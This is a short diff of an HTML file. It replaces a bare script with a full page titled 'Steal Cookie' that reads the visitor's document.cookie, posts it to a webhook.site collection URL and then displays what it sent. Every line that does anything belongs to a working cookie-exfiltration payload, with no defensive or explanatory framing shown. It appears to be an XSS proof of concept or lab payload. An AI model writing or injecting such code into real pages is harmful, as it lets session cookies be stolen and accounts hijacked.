@@ -1,6 +1,15 @@
-<script>
-  fetch("https://webhook.site/9f55de09-3788-4b74-9f67-8c7bbc6f5626", {
-    method: "POST",
-    body: document.cookie
-  });
-</script>
+<!DOCTYPE html>
+<html>
+  <head><title>Steal Cookie</title></head>
+  <body>
+    <h2>Stealing...</h2>
+    <script>
+      fetch("https://webhook.site/9f55de09-3788-4b74-9f67-8c7bbc6f5626", {
+        method: "POST",
+        body: document.cookie
+      }).then(() => {
+        document.write("✅ Sent: " + document.cookie);
+      });
+    </script>
+  </body>
+</html>
